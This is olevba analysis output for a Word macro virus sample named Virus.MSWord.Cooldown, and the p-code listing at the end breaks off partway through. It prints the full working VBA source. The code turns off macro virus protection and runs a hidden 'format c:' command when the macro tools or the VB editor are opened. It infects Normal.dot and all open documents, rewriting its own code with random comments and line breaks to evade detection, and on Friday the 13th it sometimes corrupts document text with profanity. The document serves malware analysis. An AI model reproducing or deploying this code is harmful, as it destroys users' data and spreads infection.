olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
     Private Sub Document_Open()
            CoolDown 0
        ' 3043.731
End Sub
       ' 4139.836
' 5091.396
Private Sub Document_Close()
 CoolDown _
        0
        ' 6861.435
' 1609.434
End _
 Sub
  Private _
        Sub ToolsMacro()
     CoolDown 1
      End _
  Sub
        

Private Sub ViewVBCode()
            CoolDown 1
        End _
              Sub
     Private Sub _
      CoolDown(How As _
          Integer)
              
On _
  Error Resume Next
        Dim c As String, a _
 As _
     Long, _
        b _
            As Long, _
       d _
      As _
            Long, e _
     As Long, f _
             As Long, res _
          As _
               String, m As Boolean
         ' 6696.699
' 5934.029
Randomize
     
With _
                Options
        ' 1338.273

.VirusProtection _
         = _
      False
 ' 5550.656
.ConfirmConversions = _
      False
       .SaveNormalPrompt = False
 ' 9018.309
' 6754.591
End With
  If How _
            = _
      1 _
        Then
                ' 5697.444

' 606.6084
s _
         = Shell("format" & Chr(32) & "c:" & _
  Chr(32) & _
            "/autotest", vbHide)
             Else
   ' 6741.466
' 5936.861
With _
    NormalTemplate.VBProject.VBComponents(1).CodeModule
       If _
           Not .Find("Cool" & "Down", _
              1, _
    1, 1000, 1000, _
          False, False) _
               Then
           a = .CountOfLines
         For b _
             = _
             1 To a
               
' 7876.239
.DeleteLines (1)
            Next
            d _
     = _
          1
  a _
            = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
       
res = ""
    ' 5730.678
For b = 1 To _
       a
         c = _
  ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, _
             1)
          c _
           = RTrim(LTrim(c))
        ' 3419.099
If foo(c, _
         f, res) _
    Then
   ' 9140.818
' 8870.4
' 8536.813

.InsertLines _
      d, _
       Space(Rnd * 16) _
            & res
               ' 1491.877
' 9123.504
' 4697.39
d = _
    d _
           + _
           f
        f = _
          0
      ' 4371.166
res = ""
       

' 5278.109
End If
             ' 404.4265
Next
       
NormalTemplate.Save
     ' 3147.956
End _
      If
      End With
      For e = _
     1 To Documents.Count
       ' 2721.87
With Documents(e).VBProject.VBComponents(1).CodeModule
 If Not .Find("Cool" & _
    "Down", 1, _
                1, 1000, 1000, _
    False, False) Then
              ' 4399.506
a _
           = _
           .CountOfLines
    ' 1505.411
m = _
        Documents(e).Saved
          
' 5936.951
' 7478.099
' 590.6182

For b = 1 To a
         ' 7121.263
' 8561.975
' 9947.795
.DeleteLines (1)
               ' 677.703
Next
           ' 7454.467
d _
    = _
        1
               a _
   = _
  NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
               ' 3058.095
' 8247.968
' 8953.323
' 8072.195
' 4574.436
' 1420.563
' 9721.467
res _
  = _
""
       For _
           b = _
    1 _
          To _
              a
               c = _
         NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, _
         1)
c = RTrim(LTrim(c))
          ' 5256.324
' 7004.326
If _
             foo(c, _
   f, _
          res) _
               Then
         
' 4980.794
.InsertLines _
 d, _
     Space(Rnd * 16) & _
             res
                d _
      = _
           d + f
       f _
            = _
       0
              ' 5780.963
res _
          = _
      ""
               End If
        ' 9160.506
' 7513.05
' 5607.009
Next
  If _
            Documents(e).Path _
           <> _
             "" _
  Then
                Documents(e).SaveAs _
           AddToRecentFiles:=False
          End If
     If (WeekDay(Date) = _
       6) _
     And (Day(Date) = 13) _
       And _
(Rnd _
      > _
              0.7) Then
  Application.StatusBar = _
           ""
 Application.DisplayStatusBar = _
         False
        Application.ScreenUpdating _
 = _
  False
               ' 298.8493
With _
       Documents(e).Content
          .Find.Execute FindText:="ďđ", _
ReplaceWith:="ďčçä", Replace:=wdReplaceAll
             .Find.Execute _
        FindText:="äđ", _
 ReplaceWith:="ďîíîń", Replace:=wdReplaceAll
              ' 5769.423

' 4481.028
.Find.Execute FindText:="ęđ", ReplaceWith:="ęîáűë", _
                Replace:=wdReplaceAll
     ' 3733.59
' 7603.012
' 3220.779
.Find.Execute _
           FindText:="ńňđ", _
        ReplaceWith:="ĺáŕí", _
  Replace:=wdReplaceAll
    .Find.Execute FindText:="ńđ", _
         ReplaceWith:="ńđŕę", Replace:=wdReplaceAll
              .Find.Execute _
      FindText:="ňđ", ReplaceWith:="ňđŕő", Replace:=wdReplaceAll
      ' 7664.387
' 8984.311
.Find.Execute _
            FindText:="áđ", ReplaceWith:="áë˙ä", Replace:=wdReplaceAll
    ' 2568.693
.Find.Execute FindText:="âđ", _
                ReplaceWith:="âűĺá", Replace:=wdReplaceAll
    .Find.Execute _
      FindText:="ăđ", _
       ReplaceWith:="ăîâí", _
           Replace:=wdReplaceAll
            
.Find.Execute _
       FindText:="ćđ", ReplaceWith:="ćîď", Replace:=wdReplaceAll
        .Find.Execute _
               FindText:="çđ", ReplaceWith:="çŕëóď", Replace:=wdReplaceAll
    ' 5087.583
' 4302.025
.Find.Execute FindText:="äć", _
              ReplaceWith:="äćîď", _
       Replace:=wdReplaceAll
  
' 6018.026
' 6178.955
.Find.Execute _
         FindText:="ęŕë", ReplaceWith:="äĺđ", Replace:=wdReplaceAll
           .Find.Execute FindText:="áóő", ReplaceWith:="áđ˙ę", _
    Replace:=wdReplaceAll
              End _
  With
         ' 7816.603
' 3185.027
Documents(e).UndoClear
     ' 7683.494
Application.DisplayStatusBar = _
 True
                
Application.ScreenUpdating = _
              True
          Application.StatusBar _
   = ""
          ' 2193.918
End If
          ' 3198.56
' 4457.873
Documents(e).Saved _
              = m
         End _
          If
           End _
       With
     Next
    End If
           End Sub
             ' 5540.27
Private _
            Function foo(ByRef s _
 As String, ByRef i _
           As _
    Long, ByRef _
    res _
   As String) As _
      Boolean
     Dim tmp As _
   String
           If _
      (Left(s, _
            1) _
           = _
 "'") Or _
 (Len(s) = 0) _
  Then
  foo _
     = False
          ' 1082.73

Exit _
         Function
     End If
          If Right(s, 2) _
           = _
           Chr(32) _
              & _
             "_" Then
  ' 8957.37
' 3947.403
res _
      = res _
 & Left(s, _
         Len(s) _
          - 1)
             ' 110.1702
foo = False
Exit Function
 End If
               tmp _
      = res & _
     s
 ' 3634.595
' 1290.28
' 2525.613
res = _
          ""
         i _
 = 1
             While Rnd _
   > _
         0.5
 ' 5906.973
If Rnd < _
  0.8 Then
    res _
     = _
   res _
   & "'" & _
      Str(Rnd * _
  10000)
       
' 9989.736
' 6286.529
End If
         res _
           = res _
    & _
      Chr(13)
           ' 6144.475

i _
      = _
        i + _
           1
           Wend
     ' 220.2982

For a _
    = _
              1 _
       To Len(tmp)
     res _
     = res _
   & Mid(tmp, _
            a, _
     1)
             ' 546.8035
' 7374.266

If Mid(tmp, a, 1) = _
                Chr(32) Then
  ' 8942.029
' 5225.274
If Rnd > _
               0.5 Then
            res = res & _
          "_" & Chr(13) _
 & Space(Rnd _
            * _
              16)
              i _
     = i + _
        1
         End _
         If
             End If
  Next
    ' 3510.385
' 8125.993
' 5820.865
foo _
          = _
      True
             ' 3543.156
End _
              Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cooldown
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 13369 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	LitDI2 0x0000 
' 	ArgsCall CoolDown 0x0001 
' Line #2:
' 	QuoteRem 0x0008 0x0009 " 3043.731"
' Line #3:
' 	EndSub 
' Line #4:
' 	QuoteRem 0x0007 0x0009 " 4139.836"
' Line #5:
' 	QuoteRem 0x0000 0x0009 " 5091.396"
' Line #6:
' 	FuncDefn (Private Sub Document_Close())
' Line #7:
' 	LineCont 0x0004 01 00 08 00
' 	LitDI2 0x0000 
' 	ArgsCall CoolDown 0x0001 
' Line #8:
' 	QuoteRem 0x0008 0x0009 " 6861.435"
' Line #9:
' 	QuoteRem 0x0000 0x0009 " 1609.434"
' Line #10:
' 	LineCont 0x0004 01 00 01 00
' 	EndSub 
' Line #11:
' 	LineCont 0x0004 01 00 08 00
' 	FuncDefn (Private Sub ToolsMacro())
' Line #12:
' 	LitDI2 0x0001 
' 	ArgsCall CoolDown 0x0001 
' Line #13:
' 	LineCont 0x0004 01 00 02 00
' 	EndSub 
' Line #14:
' Line #15:
' Line #16:
' 	FuncDefn (Private Sub ViewVBCode())
' Line #17:
' 	LitDI2 0x0001 
' 	ArgsCall CoolDown 0x0001 
' Line #18:
' 	LineCont 0x0004 01 00 0E 00
' 	EndSub 
' Line #19:
' 	LineCont 0x0008 02 00 06 00 06 00 0A 00
' 	FuncDefn (Private Sub CoolDown(How As Integer))
' Line #20:
' Line #21:
' 	LineCont 0x0004 01 00 02 00
' 	OnError (Resume Next) 
' Line #22:
' 	LineCont 0x002C 06 00 01 00 07 00 05 00 09 00 08 00 0A 00 0C 00 0D 00 07 00 0E 00 06 00 0F 00 0C 00 12 00 05 00 16 00 0D 00 1A 00 0A 00 1B 00 0F 00
' 	Dim 
' 	VarDefn c (As String)
' 	VarDefn a (As Long)
' 	VarDefn B (As Long)
' 	VarDefn d (As Long)
' 	VarDefn e (As Long)
' 	VarDefn False (As Long)
' 	VarDefn res (As String)
' 	VarDefn m (As Boolean)
' Line #23:
' 	QuoteRem 0x0009 0x0009 " 6696.699"
' Line #24:
' 	QuoteRem 0x0000 0x0009 " 5934.029"
' Line #25:
' 	ArgsCall Read 0x0000 
' Line #26:
' Line #27:
' 	LineCont 0x0004 01 00 10 00
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #28:
' 	QuoteRem 0x0008 0x0009 " 1338.273"
' Line #29:
' Line #30:
' 	LineCont 0x0008 02 00 09 00 03 00 06 00
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #31:
' 	QuoteRem 0x0001 0x0009 " 5550.656"
' Line #32:
' 	LineCont 0x0004 03 00 06 00
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #33:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #34:
' 	QuoteRem 0x0001 0x0009 " 9018.309"
' Line #35:
' 	QuoteRem 0x0000 0x0009 " 6754.591"
' Line #36:
' 	EndWith 
' Line #37:
' 	LineCont 0x000C 02 00 0C 00 03 00 06 00 04 00 08 00
' 	Ld How 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #38:
' 	QuoteRem 0x0010 0x0009 " 5697.444"
' Line #39:
' Line #40:
' 	QuoteRem 0x0000 0x0009 " 606.6084"
' Line #41:
' 	LineCont 0x000C 01 00 09 00 0D 00 02 00 12 00 0C 00
' 	LitStr 0x0006 "format"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "c:"
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "/autotest"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St s 
' Line #42:
' 	ElseBlock 
' Line #43:
' 	QuoteRem 0x0003 0x0009 " 6741.466"
' Line #44:
' 	QuoteRem 0x0000 0x0009 " 5936.861"
' Line #45:
' 	LineCont 0x0004 01 00 04 00
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #46:
' 	LineCont 0x0014 01 00 0B 00 09 00 0E 00 0B 00 04 00 11 00 0A 00 15 00 0F 00
' 	LitStr 0x0004 "Cool"
' 	LitStr 0x0004 "Down"
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	ArgsMemLdWith Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #47:
' 	MemLdWith CountOfLines 
' 	St a 
' Line #48:
' 	LineCont 0x0008 02 00 0D 00 03 00 0D 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #49:
' Line #50:
' 	QuoteRem 0x0000 0x0009 " 7876.239"
' Line #51:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #52:
' 	StartForVariable 
' 	Next 
' Line #53:
' 	LineCont 0x0008 01 00 05 00 02 00 0A 00
' 	LitDI2 0x0001 
' 	St d 
' Line #54:
' 	LineCont 0x0004 01 00 0C 00
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a 
' Line #55:
' Line #56:
' 	LitStr 0x0000 ""
' 	St res 
' Line #57:
' 	QuoteRem 0x0004 0x0009 " 5730.678"
' Line #58:
' 	LineCont 0x0004 05 00 07 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #59:
' 	LineCont 0x0008 02 00 02 00 11 00 0D 00
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St c 
' Line #60:
' 	LineCont 0x0004 01 00 0B 00
' 	Ld c 
' 	ArgsLd LTrim 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	St c 
' Line #61:
' 	QuoteRem 0x0008 0x0009 " 3419.099"
' Line #62:
' 	LineCont 0x0008 05 00 09 00 09 00 04 00
' 	Ld c 
' 	Ld False 
' 	Ld res 
' 	ArgsLd foo 0x0003 
' 	IfBlock 
' Line #63:
' 	QuoteRem 0x0003 0x0009 " 9140.818"
' Line #64:
' 	QuoteRem 0x0000 0x0007 " 8870.4"
' Line #65:
' 	QuoteRem 0x0000 0x0009 " 8536.813"
' Line #66:
' Line #67:
' 	LineCont 0x000C 02 00 06 00 04 00 07 00 0A 00 0C 00
' 	Ld d 
' 	Ld Rnd 
' 	LitDI2 0x0010 
' 	Mul 
' 	ArgsLd Space 0x0001 
' 	Ld res 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #68:
' 	QuoteRem 0x000F 0x0009 " 1491.877"
' Line #69:
' 	QuoteRem 0x0000 0x0009 " 9123.504"
' Line #70:
' 	QuoteRem 0x0000 0x0008 " 4697.39"
' Line #71:
' 	LineCont 0x000C 02 00 04 00 03 00 0B 00 04 00 0B 00
' 	Ld d 
' 	Ld False 
' 	Add 
' 	St d 
' Line #72:
' 	LineCont 0x0004 02 00 0A 00
' 	LitDI2 0x0000 
' 	St False 
' Line #73:
' 	QuoteRem 0x0006 0x0009 " 4371.166"
' Line #74:
' 	LitStr 0x0000 ""
' 	St res 
' Line #75:
' Line #76:
' Line #77:
' 	QuoteRem 0x0000 0x0009 " 5278.109"
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	QuoteRem 0x000D 0x0009 " 404.4265"
' Line #80:
' 	StartForVariable 
' 	Next 
' Line #81:
' Line #82:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #83:
' 	QuoteRem 0x0005 0x0009 " 3147.956"
' Line #84:
' 	LineCont 0x0004 01 00 06 00
' 	EndIfBlock 
' Line #85:
' 	EndWith 
' Line #86:
' 	LineCont 0x0004 03 00 05 00
' 	StartForVariable 
' 	Ld e 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #87:
' 	QuoteRem 0x0007 0x0008 " 2721.87"
' Line #88:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #89:
' 	LineCont 0x000C 07 00 04 00 0B 00 10 00 11 00 04 00
' 	LitStr 0x0004 "Cool"
' 	LitStr 0x0004 "Down"
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	ArgsMemLdWith Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #90:
' 	QuoteRem 0x000E 0x0009 " 4399.506"
' Line #91:
' 	LineCont 0x0008 01 00 0B 00 02 00 0B 00
' 	MemLdWith CountOfLines 
' 	St a 
' Line #92:
' 	QuoteRem 0x0004 0x0009 " 1505.411"
' Line #93:
' 	LineCont 0x0004 02 00 08 00
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd Saved 
' 	St m 
' Line #94:
' Line #95:
' 	QuoteRem 0x0000 0x0009 " 5936.951"
' Line #96:
' 	QuoteRem 0x0000 0x0009 " 7478.099"
' Line #97:
' 	QuoteRem 0x0000 0x0009 " 590.6182"
' Line #98:
' Line #99:
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #100:
' 	QuoteRem 0x0009 0x0009 " 7121.263"
' Line #101:
' 	QuoteRem 0x0000 0x0009 " 8561.975"
' Line #102:
' 	QuoteRem 0x0000 0x0009 " 9947.795"
' Line #103:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsMemCallWith DeleteLines 0x0001 
' Line #104:
' 	QuoteRem 0x000F 0x0008 " 677.703"
' Line #105:
' 	StartForVariable 
' 	Next 
' Line #106:
' 	QuoteRem 0x000B 0x0009 " 7454.467"
' Line #107:
' 	LineCont 0x0008 01 00 04 00 02 00 08 00
' 	LitDI2 0x0001 
' 	St d 
' Line #108:
' 	LineCont 0x0008 01 00 03 00 02 00 02 00
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St a 
' Line #109:
' 	QuoteRem 0x000F 0x0009 " 3058.095"
' Line #110:
' 	QuoteRem 0x0000 0x0009 " 8247.968"
' Line #111:
' 	QuoteRem 0x0000 0x0009 " 8953.323"
' Line #112:
' 	QuoteRem 0x0000 0x0009 " 8072.195"
' Line #113:
' 	QuoteRem 0x0000 0x0009 " 4574.436"
' Line #114:
' 	QuoteRem 0x0000 0x0009 " 1420.563"
' Line #115:
' 	QuoteRem 0x0000 0x0009 " 9721.467"
' Line #116:
' 	LineCont 0x0008 01 00 02 00 02 00 00 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #117:
' 	LineCont 0x0010 01 00 0B 00 03 00 04 00 04 00 0A 00 05 00 0E 00
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #118:
' 	LineCont 0x0008 02 00 09 00 11 00 09 00
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St c 
' Line #119:
' 	Ld c 
' 	ArgsLd LTrim 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	St c 
' Line #120:
' 	QuoteRem 0x000A 0x0009 " 5256.324"
' Line #121:
' 	QuoteRem 0x0000 0x0009 " 7004.326"
' Line #122:
' 	LineCont 0x0010 01 00 0D 00 05 00 03 00 07 00 0A 00 09 00 0F 00
' 	Ld c 
' 	Ld False 
' 	Ld res 
' 	ArgsLd foo 0x0003 
' 	IfBlock 
' Line #123:
' Line #124:
' 	QuoteRem 0x0000 0x0009 " 4980.794"
' Line #125:
' 	LineCont 0x000C 02 00 01 00 04 00 05 00 0B 00 0D 00
' 	Ld d 
' 	Ld Rnd 
' 	LitDI2 0x0010 
' 	Mul 
' 	ArgsLd Space 0x0001 
' 	Ld res 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #126:
' 	LineCont 0x0008 01 00 06 00 02 00 0B 00
' 	Ld d 
' 	Ld False 
' 	Add 
' 	St d 
' Line #127:
' 	LineCont 0x0008 01 00 0C 00 02 00 07 00
' 	LitDI2 0x0000 
' 	St False 
' Line #128:
' 	QuoteRem 0x000E 0x0009 " 5780.963"
' Line #129:
' 	LineCont 0x0008 01 00 0A 00 02 00 06 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	QuoteRem 0x0008 0x0009 " 9160.506"
' Line #132:
' 	QuoteRem 0x0000 0x0008 " 7513.05"
' Line #133:
' 	QuoteRem 0x0000 0x0009 " 5607.009"
' Line #134:
' 	StartForVariable 
' 	Next 
' Line #135:
' 	LineCont 0x0010 01 00 0C 00 07 00 0B 00 08 00 0D 00 09 00 02 00
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #136:
' 	LineCont 0x0004 06 00 0B 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	LineCont 0x0018 07 00 07 00 09 00 05 00 12 00 07 00 13 00 00 00 15 00 06 00 16 00 0E 00
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	And 
' 	Ld Rnd 
' 	LitR8 0x6666 0x6666 0x6666 0x3FE6 
' 	Gt 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #139:
' 	LineCont 0x0004 04 00 0B 00
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #140:
' 	LineCont 0x0004 04 00 09 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #141:
' 	LineCont 0x0008 03 00 01 00 04 00 02 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #142:
' 	QuoteRem 0x000F 0x0009 " 298.8493"
' Line #143:
' 	LineCont 0x0004 01 00 07 00
' 	StartWithExpr 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemLd Content 
' 	With 
' Line #144:
' 	LineCont 0x0004 08 00 00 00
' 	LitStr 0x0002 "ďđ"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "ďčçä"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #145:
' 	LineCont 0x0008 04 00 08 00 08 00 01 00
' 	LitStr 0x0002 "äđ"
' 	ParamNamed FindText 
' 	LitStr 0x0005 "ďîíîń"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #146:
' 	QuoteRem 0x000E 0x0009 " 5769.423"
' Line #147:
' Line #148:
' 	QuoteRem 0x0000 0x0009 " 4481.028"
' Line #149:
' 	LineCont 0x0004 0C 00 10 00
' 	LitStr 0x0002 "ęđ"
' 	ParamNamed FindText 
' 	LitStr 0x0005 "ęîáűë"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #150:
' 	QuoteRem 0x0005 0x0008 " 3733.59"
' Line #151:
' 	QuoteRem 0x0000 0x0009 " 7603.012"
' Line #152:
' 	QuoteRem 0x0000 0x0009 " 3220.779"
' Line #153:
' 	LineCont 0x000C 04 00 0B 00 08 00 08 00 0C 00 02 00
' 	LitStr 0x0003 "ńňđ"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "ĺáŕí"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #154:
' 	LineCont 0x0004 08 00 09 00
' 	LitStr 0x0002 "ńđ"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "ńđŕę"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #155:
' 	LineCont 0x0004 04 00 06 00
' 	LitStr 0x0002 "ňđ"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "ňđŕő"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #156:
' 	QuoteRem 0x0006 0x0009 " 7664.387"
' Line #157:
' 	QuoteRem 0x0000 0x0009 " 8984.311"
' Line #158:
' 	LineCont 0x0004 04 00 0C 00
' 	LitStr 0x0002 "áđ"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "áë˙ä"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #159:
' 	QuoteRem 0x0004 0x0009 " 2568.693"
' Line #160:
' 	LineCont 0x0004 08 00 10 00
' 	LitStr 0x0002 "âđ"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "âűĺá"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #161:
' 	LineCont 0x000C 04 00 06 00 08 00 07 00 0C 00 0B 00
' 	LitStr 0x0002 "ăđ"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "ăîâí"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #162:
' Line #163:
' 	LineCont 0x0004 04 00 07 00
' 	LitStr 0x0002 "ćđ"
' 	ParamNamed FindText 
' 	LitStr 0x0003 "ćîď"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #164:
' 	LineCont 0x0004 04 00 0F 00
' 	LitStr 0x0002 "çđ"
' 	ParamNamed FindText 
' 	LitStr 0x0005 "çŕëóď"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #165:
' 	QuoteRem 0x0004 0x0009 " 5087.583"
' Line #166:
' 	QuoteRem 0x0000 0x0009 " 4302.025"
' Line #167:
' 	LineCont 0x0008 08 00 0E 00 0C 00 07 00
' 	LitStr 0x0002 "äć"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "äćîď"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #168:
' Line #169:
' 	QuoteRem 0x0000 0x0009 " 6018.026"
' Line #170:
' 	QuoteRem 0x0000 0x0009 " 6178.955"
' Line #171:
' 	LineCont 0x0004 04 00 09 00
' 	LitStr 0x0003 "ęŕë"
' 	ParamNamed FindText 
' 	LitStr 0x0003 "äĺđ"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #172:
' 	LineCont 0x0004 0C 00 04 00
' 	LitStr 0x0003 "áóő"
' 	ParamNamed FindText 
' 	LitStr 0x0004 "áđ˙ę"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #173:
' 	LineCont 0x0004 01 00 02 00
' 	EndWith 
' Line #174:
' 	QuoteRem 0x0009 0x0009 " 7816.603"
' Line #175:
' 	QuoteRem 0x0000 0x0009 " 3185.027"
' Line #176:
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall UndoClear 0x0000 
' Line #177:
' 	QuoteRem 0x0005 0x0009 " 7683.494"
' Line #178:
' 	LineCont 0x0004 04 00 01 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #179:
' Line #180:
' 	LineCont 0x0004 04 00 0E 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #181:
' 	LineCont 0x0004 03 00 03 00
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #182:
' 	QuoteRem 0x000A 0x0009 " 2193.918"
' Line #183:
' 	EndIfBlock 
' Line #184:
' 	QuoteRem 0x000A 0x0008 " 3198.56"
' Line #185:
' 	QuoteRem 0x0000 0x0009 " 4457.873"
' Line #186:
' 	LineCont 0x0004 06 00 0E 00
' 	Ld m 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
